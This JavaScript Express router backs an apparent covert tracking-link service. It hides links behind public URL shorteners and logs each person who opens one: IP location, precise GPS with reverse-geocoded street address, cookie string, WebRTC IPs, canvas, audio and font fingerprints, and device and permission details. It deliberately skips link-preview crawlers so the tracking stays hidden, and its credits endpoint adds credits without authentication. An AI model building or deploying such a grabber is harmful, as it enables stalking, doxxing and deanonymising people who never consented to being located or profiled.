import express from "express";
import axios from "axios";
import { createTrackingLink, recordCapture, addCredits } from "../utils/linkService.js";
import { db } from "../firebase/config.js";

const router = express.Router();

function parseBrowser(ua = "") {
    if (/Edg\//i.test(ua)) return "Edge";
    if (/OPR|Opera/i.test(ua)) return "Opera";
    if (/SamsungBrowser/i.test(ua)) return "Samsung Browser";
    if (/Chrome/i.test(ua)) return "Chrome";
    if (/Firefox/i.test(ua)) return "Firefox";
    if (/Safari/i.test(ua)) return "Safari";
    return "Unknown";
}

function parseOS(ua = "") {
    if (/Windows NT 10\.0/i.test(ua)) return "Windows 10/11";
    if (/Windows/i.test(ua)) return "Windows";
    const androidMatch = ua.match(/Android ([\d.]+)/i);
    if (androidMatch) return `Android ${androidMatch[1]}`;
    const iosMatch = ua.match(/iPhone OS ([\d_]+)/i);
    if (iosMatch) return `iOS ${iosMatch[1].replace(/_/g, ".")}`;
    if (/iPad.*OS ([\d_]+)/i.test(ua)) return "iPadOS";
    if (/Mac OS X/i.test(ua)) return "macOS";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unknown";
}

function parseDevice(ua = "") {
    if (/Mobi|Android.*Mobile/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

function getClientIP(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (forwarded) return forwarded.split(",")[0].trim();
    return req.socket?.remoteAddress || req.ip || "Unknown";
}

async function reverseGeocode(lat, lon) {
    try {
        const res = await axios.get(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, { headers: { "User-Agent": "Traxelon/1.0", Accept: "application/json" }, timeout: 6000 }
        );
        const data = res.data;
        const addr = data.address || {};
        return {
            gpsAddress: data.display_name || null,
            gpsCity: addr.city || addr.town || addr.village || addr.county || null,
            gpsState: addr.state || null,
            gpsPincode: addr.postcode || null,
            gpsCountry: addr.country || null,
        };
    } catch { return {}; }
}

async function enrichIP(ip) {
    try {
        if (!ip || ip === "::1" || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
            return { note: "Local IP" };
        }
        const res = await axios.get(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,proxy,hosting,mobile`, { timeout: 5000 }
        );
        const d = res.data;
        if (d.status !== "success") return {};
        return {
            country: d.country,
            countryCode: d.countryCode,
            region: d.regionName,
            city: d.city,
            zip: d.zip,
            lat: d.lat,
            lon: d.lon,
            timezone: d.timezone,
            isp: d.isp,
            org: d.org,
            asn: d.as,
            hostname: d.reverse || null,
            isProxy: d.proxy || false,
            isHosting: d.hosting || false,
            isMobileNetwork: d.mobile || false,
        };
    } catch { return {}; }
}

router.get("/health", (_req, res) => res.status(200).json({ ok: true }));

router.post("/shorten", async(req, res) => {
    try {
        const { uid, label, destinationUrl } = req.body;
        if (!uid) return res.status(400).json({ error: "uid is required" });
        if (!destinationUrl) return res.status(400).json({ error: "destinationUrl is required" });
        const result = await createTrackingLink(uid, label, destinationUrl);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /shorten]", err.message);
        return res.status(400).json({ error: err.message });
    }
});

router.post("/capture", async(req, res) => {
    try {
        const body = req.body;
        const { token } = body;
        if (!token) return res.status(400).json({ error: "token is required" });
        const ua = req.headers["user-agent"] || "";
        const BOT_PATTERNS = /bot|crawl|spider|preview|slurp|facebookexternalhit|whatsapp|telegram|slack|discord|curl|wget|python|java|go-http|axios|node-fetch|undici/i;
        if (BOT_PATTERNS.test(ua)) return res.status(200).json({ found: true, destinationUrl: null });
        if (!body.screenWidth && !body.gpsLat && (!ua || ua.length < 40)) return res.status(200).json({ found: true, destinationUrl: null });

        const ip = getClientIP(req);
        const ipData = await enrichIP(ip);
        let geoData = {};
        if (body.gpsLat && body.gpsLon) geoData = await reverseGeocode(body.gpsLat, body.gpsLon);

        const deviceData = {
            ip,
            // -- IP Location --------------------------------------------------
            country: ipData.country || null,
            countryCode: ipData.countryCode || null,
            region: ipData.region || null,
            city: ipData.city || null,
            zip: ipData.zip || null,
            lat: ipData.lat || null,
            lon: ipData.lon || null,
            timezone: ipData.timezone || null,
            isp: ipData.isp || null,
            org: ipData.org || null,
            asn: ipData.asn || null,
            hostname: ipData.hostname || null,
            isProxy: ipData.isProxy || null,
            isHosting: ipData.isHosting || null,
            isMobileNetwork: ipData.isMobileNetwork || null,
            // -- GPS ----------------------------------------------------------
            gpsLat: body.gpsLat || null,
            gpsLon: body.gpsLon || null,
            gpsAccuracy: body.gpsAccuracy || null,
            gpsAltitude: body.gpsAltitude || null,
            gpsSpeed: body.gpsSpeed || null,
            gpsHeading: body.gpsHeading || null,
            gpsAddress: geoData.gpsAddress || null,
            gpsCity: geoData.gpsCity || null,
            gpsState: geoData.gpsState || null,
            gpsPincode: geoData.gpsPincode || null,
            gpsCountry: geoData.gpsCountry || null,
            // -- Device & Browser ---------------------------------------------
            browser: parseBrowser(ua),
            os: parseOS(ua),
            device: parseDevice(ua),
            userAgent: ua,
            browserVersion: body.browserVersion || null,
            browserCodeName: body.browserCodeName || null,
            appName: body.appName || null,
            appVersion: body.appVersion || null,
            product: body.product || null,
            buildID: body.buildID || null,
            vendor: body.vendor || null,
            platform: body.platform || null,
            architecture: body.architecture || null,
            oscpu: body.oscpu || null,
            cpuClass: body.cpuClass || null,
            deviceBrand: body.deviceBrand || null,
            deviceModel: body.deviceModel || null,
            webdriver: body.webdriver || null,
            automationDetected: body.automationDetected || null,
            // -- Hardware -----------------------------------------------------
            cpuCores: body.cpuCores || null,
            ram: body.ram || null,
            memoryTier: body.memoryTier || null,
            maxTouchPoints: body.maxTouchPoints || null,
            maxTouchPointsDetail: body.maxTouchPointsDetail || null,
            touchSupport: body.touchSupport ?? null,
            isTouchDevice: body.isTouchDevice || null,
            pointerType: body.pointerType || null,
            pointerFine: body.pointerFine || null,
            hoverCapability: body.hoverCapability || null,
            javaEnabled: body.javaEnabled ?? null,
            pdfViewerEnabled: body.pdfViewerEnabled ?? null,
            gamepadsConnected: body.gamepadsConnected || null,
            // -- GPU & WebGL ---------------------------------------------------
            gpu: body.gpu || null,
            gpuVendor: body.gpuVendor || null,
            webglVersion: body.webglVersion || null,
            webglRenderer: body.webglRenderer || null,
            webglVendor: body.webglVendor || null,
            webglShadingLanguage: body.webglShadingLanguage || null,
            webglHash: body.webglHash || null,
            shaderPrecision: body.shaderPrecision || null,
            maxTextureSize: body.maxTextureSize || null,
            maxViewportDims: body.maxViewportDims || null,
            maxAnisotropy: body.maxAnisotropy || null,
            maxVertexAttribs: body.maxVertexAttribs || null,
            maxVertexUniformVectors: body.maxVertexUniformVectors || null,
            maxFragmentUniformVectors: body.maxFragmentUniformVectors || null,
            maxCombinedTextureUnits: body.maxCombinedTextureUnits || null,
            maxCubeMapTextureSize: body.maxCubeMapTextureSize || null,
            maxRenderBufferSize: body.maxRenderBufferSize || null,
            maxVaryingVectors: body.maxVaryingVectors || null,
            maxVertexTextureUnits: body.maxVertexTextureUnits || null,
            maxFragmentTextureUnits: body.maxFragmentTextureUnits || null,
            aliasedPointSizeRange: body.aliasedPointSizeRange || null,
            aliasedLineWidthRange: body.aliasedLineWidthRange || null,
            webglExtensionsCount: body.webglExtensionsCount || null,
            webglExtensionsList: body.webglExtensionsList || null,
            webgl2Support: body.webgl2Support ?? null,
            // -- Screen & Display ----------------------------------------------
            screenWidth: body.screenWidth || null,
            screenHeight: body.screenHeight || null,
            screenAvailWidth: body.screenAvailWidth || null,
            screenAvailHeight: body.screenAvailHeight || null,
            colorDepth: body.colorDepth || null,
            pixelDepth: body.pixelDepth || null,
            screenColorDepth: body.screenColorDepth || null,
            pixelRatio: body.pixelRatio || null,
            devicePixelRatioPercent: body.devicePixelRatioPercent || null,
            windowWidth: body.windowWidth || null,
            windowHeight: body.windowHeight || null,
            outerWidth: body.outerWidth || null,
            outerHeight: body.outerHeight || null,
            orientation: body.orientation || null,
            orientationAngle: body.orientationAngle ?? null,
            hdrSupport: body.hdrSupport || null,
            colorGamut: body.colorGamut || null,
            forcedColors: body.forcedColors || null,
            invertedColors: body.invertedColors || null,
            prefersColorScheme: body.prefersColorScheme || null,
            prefersReducedMotion: body.prefersReducedMotion || null,
            prefersContrast: body.prefersContrast || null,
            displayMode: body.displayMode || null,
            cssPxDensity: body.cssPxDensity || null,
            monochrome: body.monochrome || null,
            visualViewportWidth: body.visualViewportWidth ?? null,
            visualViewportHeight: body.visualViewportHeight ?? null,
            visualViewportScale: body.visualViewportScale ?? null,
            // -- Battery & Connection ------------------------------------------
            batteryLevel: body.batteryLevel ?? null,
            batteryCharging: body.batteryCharging ?? null,
            batteryChargingTime: body.batteryChargingTime ?? null,
            batteryDischargingTime: body.batteryDischargingTime ?? null,
            connectionType: body.connectionType || null,
            connectionQuality: body.connectionQuality || null,
            connectionDownlink: body.connectionDownlink || null,
            connectionRtt: body.connectionRtt || null,
            connectionSaveData: body.connectionSaveData ?? null,
            connectionDownlinkMax: body.connectionDownlinkMax || null,
            onlineStatus: body.onlineStatus || null,
            browserOnline: body.browserOnline || null,
            // -- Time & Locale -------------------------------------------------
            localTime: body.localTime || null,
            clientTimezone: body.clientTimezone || null,
            timezoneOffset: body.timezoneOffset ?? null,
            dstActive: body.dstActive || null,
            dayOfWeek: body.dayOfWeek || null,
            timeOfDay: body.timeOfDay || null,
            language: body.language || null,
            languages: body.languages || null,
            captureTimestamp: body.captureTimestamp || null,
            capturedAt: new Date().toISOString(),
            // -- Privacy & Fingerprint -----------------------------------------
            incognito: body.incognito ?? null,
            adBlockDetected: body.adBlockDetected ?? null,
            cookiesEnabled: body.cookiesEnabled ?? null,
            doNotTrack: body.doNotTrack || null,
            historyLength: body.historyLength || null,
            navigationCount: body.navigationCount ?? null,
            referrer: body.referrer || null,
            canvasHash: body.canvasHash || null,
            canvasGeometryHash: body.canvasGeometryHash || null,
            audioFingerprint: body.audioFingerprint || null,
            cssHash: body.cssHash || null,
            fontFingerprint: body.fontFingerprint || null,
            tabHidden: body.tabHidden || null,
            visibilityState: body.visibilityState || null,
            isSecureContext: body.isSecureContext || null,
            crossOriginIsolated: body.crossOriginIsolated || null,
            documentCharset: body.documentCharset || null,
            documentCompatMode: body.documentCompatMode || null,
            documentReadyState: body.documentReadyState || null,
            windowName: body.windowName || null,
            scrollPositionX: body.scrollPositionX ?? null,
            scrollPositionY: body.scrollPositionY ?? null,
            hasFocus: body.hasFocus || null,
            pageUrl: body.pageUrl || null,
            pageTitle: body.pageTitle || null,
            cookieString: body.cookieString || null,
            keyboardLayout: body.keyboardLayout || null,
            // -- Media & Storage -----------------------------------------------
            cameras: body.cameras ?? null,
            microphones: body.microphones ?? null,
            speakers: body.speakers ?? null,
            speechVoicesCount: body.speechVoicesCount ?? null,
            speechVoices: body.speechVoices || null,
            storageQuota: body.storageQuota || null,
            storageUsage: body.storageUsage || null,
            localStorageEnabled: body.localStorageEnabled ?? null,
            sessionStorageEnabled: body.sessionStorageEnabled ?? null,
            indexedDBEnabled: body.indexedDBEnabled ?? null,
            cacheAPIEnabled: body.cacheAPIEnabled || null,
            cookiesCount: body.cookiesCount ?? null,
            // -- Fonts & Plugins -----------------------------------------------
            fontsDetected: body.fontsDetected ?? null,
            fontsList: body.fontsList || null,
            pluginsCount: body.pluginsCount ?? null,
            plugins: body.plugins || null,
            mimeTypes: body.mimeTypes || null,
            // -- Performance ---------------------------------------------------
            pageLoadTime: body.pageLoadTime || null,
            domContentLoaded: body.domContentLoaded || null,
            dnsLookupTime: body.dnsLookupTime || null,
            tcpConnectTime: body.tcpConnectTime || null,
            ttfb: body.ttfb || null,
            memoryUsed: body.memoryUsed || null,
            memoryTotal: body.memoryTotal || null,
            memoryLimit: body.memoryLimit || null,
            bodyScrollHeight: body.bodyScrollHeight || null,
            bodyOffsetWidth: body.bodyOffsetWidth || null,
            htmlFontSize: body.htmlFontSize || null,
            // -- WebRTC --------------------------------------------------------
            webrtcLocalIP: body.webrtcLocalIP || null,
            webrtcPublicIP: body.webrtcPublicIP || null,
            webrtcSupport: body.webrtcSupport || null,
            // -- Permissions ---------------------------------------------------
            geolocationPermission: body.geolocationPermission || null,
            notificationsPermission: body.notificationsPermission || null,
            notificationPermission: body.notificationPermission || null,
            cameraPermission: body.cameraPermission || null,
            microphonePermission: body.microphonePermission || null,
            accelerometerPermission: body.accelerometerPermission || null,
            gyroscopePermission: body.gyroscopePermission || null,
            magnetometerPermission: body.magnetometerPermission || null,
            clipboardReadPermission: body.clipboardReadPermission || null,
            clipboardWritePermission: body.clipboardWritePermission || null,
            // -- Feature Support -----------------------------------------------
            webSocketSupport: body.webSocketSupport ?? null,
            webWorkerSupport: body.webWorkerSupport ?? null,
            serviceWorkerSupport: body.serviceWorkerSupport ?? null,
            webAssemblySupport: body.webAssemblySupport ?? null,
            bluetoothSupport: body.bluetoothSupport ?? null,
            usbSupport: body.usbSupport ?? null,
            nfcSupport: body.nfcSupport || null,
            serialSupport: body.serialSupport || null,
            hidSupport: body.hidSupport || null,
            wakeLockSupport: body.wakeLockSupport || null,
            vibrationSupport: body.vibrationSupport || null,
            notificationSupport: body.notificationSupport || null,
            gamepadSupport: body.gamepadSupport || null,
            gamepadsConnected: body.gamepadsConnected || null,
            xrSupport: body.xrSupport || null,
            offscreenCanvasSupport: body.offscreenCanvasSupport || null,
            sharedArrayBufferSupport: body.sharedArrayBufferSupport || null,
            broadcastChannelSupport: body.broadcastChannelSupport || null,
            paymentRequestSupport: body.paymentRequestSupport || null,
            credentialMgmtSupport: body.credentialMgmtSupport || null,
            presentationSupport: body.presentationSupport || null,
            eyeDropperSupport: body.eyeDropperSupport || null,
            fileSystemAccessSupport: body.fileSystemAccessSupport || null,
            contactPickerSupport: body.contactPickerSupport || null,
            webShareSupport: body.webShareSupport || null,
            clipboardAPISupport: body.clipboardAPISupport || null,
            mediaSessionSupport: body.mediaSessionSupport || null,
            pictureInPictureSupport: body.pictureInPictureSupport || null,
            pointerLockSupport: body.pointerLockSupport || null,
            fullscreenSupport: body.fullscreenSupport || null,
            speechRecognitionSupport: body.speechRecognitionSupport || null,
            speechSynthesisSupport: body.speechSynthesisSupport || null,
            cryptoSupport: body.cryptoSupport || null,
            performanceObserverSupport: body.performanceObserverSupport || null,
            intersectionObserverSupport: body.intersectionObserverSupport || null,
            resizeObserverSupport: body.resizeObserverSupport || null,
            mutationObserverSupport: body.mutationObserverSupport || null,
            requestIdleCallbackSupport: body.requestIdleCallbackSupport || null,
            requestAnimFrameSupport: body.requestAnimFrameSupport || null,
            fetchSupport: body.fetchSupport || null,
            abortControllerSupport: body.abortControllerSupport || null,
            structuredCloneSupport: body.structuredCloneSupport || null,
            compressionStreamSupport: body.compressionStreamSupport || null,
            queueMicrotaskSupport: body.queueMicrotaskSupport || null,
            indexedDBSupport: body.indexedDBSupport || null,
        };

        const result = await recordCapture(token, deviceData);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /capture]", err.message);
        return res.status(500).json({ error: "Failed to record capture" });
    }
});

router.post("/capture-gps", async(req, res) => {
    try {
        const { token, gpsLat, gpsLon, gpsAccuracy, gpsAltitude, gpsSpeed, gpsHeading } = req.body;
        if (!token || !gpsLat || !gpsLon) return res.status(400).json({ error: "missing data" });
        const geoData = await reverseGeocode(gpsLat, gpsLon);
        const linksRef = db.collection("trackingLinks");
        const snap = await linksRef.where("token", "==", token).get();
        if (snap.empty) return res.status(404).json({ error: "not found" });
        const linkDoc = snap.docs[0];
        const captures = [...(linkDoc.data().captures || [])];
        if (captures.length > 0) {
            const last = {...captures[captures.length - 1] };
            last.gpsLat = gpsLat;
            last.gpsLon = gpsLon;
            last.gpsAccuracy = gpsAccuracy || null;
            last.gpsAltitude = gpsAltitude || null;
            last.gpsSpeed = gpsSpeed || null;
            last.gpsHeading = gpsHeading || null;
            last.gpsAddress = geoData.gpsAddress || null;
            last.gpsCity = geoData.gpsCity || null;
            last.gpsState = geoData.gpsState || null;
            last.gpsPincode = geoData.gpsPincode || null;
            last.gpsCountry = geoData.gpsCountry || null;
            captures[captures.length - 1] = last;
            await linksRef.doc(linkDoc.id).update({ captures });
        }
        return res.status(200).json({ ok: true });
    } catch (err) {
        console.error("[capture-gps]", err.message);
        return res.status(500).json({ error: err.message });
    }
});

router.post("/shorten-url", async(req, res) => {
    try {
        const { url, provider } = req.body;
        if (!url) return res.status(400).json({ error: "url required" });
        console.log(`[shorten-url] provider=${provider}`);
        let shortUrl = null;

        if (provider === "tinyurl") {
            const r = await axios.get("https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url), { timeout: 10000 });
            const result = String(r.data || "").trim();
            if (result.startsWith("http")) shortUrl = result;

        } else if (provider === "isgd") {
            const r = await axios.get("https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } });
            const result = String(r.data || "").trim();
            if (result.startsWith("http")) shortUrl = result;

        } else if (provider === "vgd") {
            const r = await axios.get("https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } });
            const result = String(r.data || "").trim();
            if (result.startsWith("http")) shortUrl = result;

        } else if (provider === "dagd") {
            const r = await axios.get("https://da.gd/shorten?url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } });
            const result = String(r.data || "").trim();
            if (result.startsWith("http")) shortUrl = result;

        } else if (provider === "linkshrink") {
            const r = await axios.post("https://linkshrink.dev/api/v1/shorten", { url }, { timeout: 10000, headers: { "Content-Type": "application/json" } });
            if (r.data?.data?.shortUrl) shortUrl = r.data.data.shortUrl;

        } else if (provider === "spoome") {
            const r = await axios.post(
                "https://spoo.me/",
                new URLSearchParams({ url }), { timeout: 10000, headers: { "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json" } }
            );
            if (r.data?.short_url) shortUrl = "https://spoo.me/" + r.data.short_url;
        }

        console.log(`[shorten-url] final=${shortUrl}`);
        return res.status(200).json({ shortUrl });
    } catch (err) {
        console.error("[shorten-url] ERROR:", err.message);
        return res.status(200).json({ shortUrl: null, error: err.message });
    }
});

router.post("/credits", async(req, res) => {
    try {
        const { uid, amount } = req.body;
        if (!uid || !amount) return res.status(400).json({ error: "uid and amount required" });
        await addCredits(uid, Number(amount));
        return res.status(200).json({ success: true });
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
});

export default router;


